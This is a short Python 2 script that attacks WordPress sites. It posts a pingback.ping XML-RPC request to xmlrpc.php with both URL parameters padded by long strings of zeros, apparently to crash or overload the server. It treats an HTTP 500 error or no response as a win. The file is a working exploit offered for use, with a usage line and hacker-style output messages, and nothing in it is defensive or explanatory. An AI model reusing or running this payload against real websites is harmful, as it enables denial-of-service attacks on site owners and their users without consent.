#!/usr/bin/python2
import sys, socket, requests
from urlparse import urlparse

xml = '''<?xml version="1.0"?>
  <methodCall>
    <methodName>pingback.ping</methodName>
    <params><param><value>
          <string>http://%s/index.php</string>
    </value></param>
    <param><value>
      <string>http://%s/index.php</string>
    </value></param>
    </params>
  </methodCall>'''

class Main:
	def __init__(self, domain):
		# urlparse is nice.
		url = urlparse(domain)
		self.path   = url.path
		self.domain = url.netloc

	def main(self):
	
		p4yl0ad = xml % ('0' * ((0x500-16*1-2*8-1-8)), '0' * ((0x500-16*1-2*8-1-8)))

		mReq = requests.post('http://%s/%sxmlrpc.php' % (self.domain, self.path), data=p4yl0ad)
		if mReq.status_code is 500:
			print '[+] bl1ng bl1ng'
		elif mReq.status_code is None:
			print '[+] bl1ng bl1ng'
		else:
			print '[+] Admin Wins'

if __name__ == '__main__':
	if len(sys.argv) > 1 and len(sys.argv) <= 3:
		x = Main(sys.argv[1])
		x.main()
	else:
		print '[+] Usage: %s <domain>.com/<path/xmlrpc.php' % sys.argv[0]
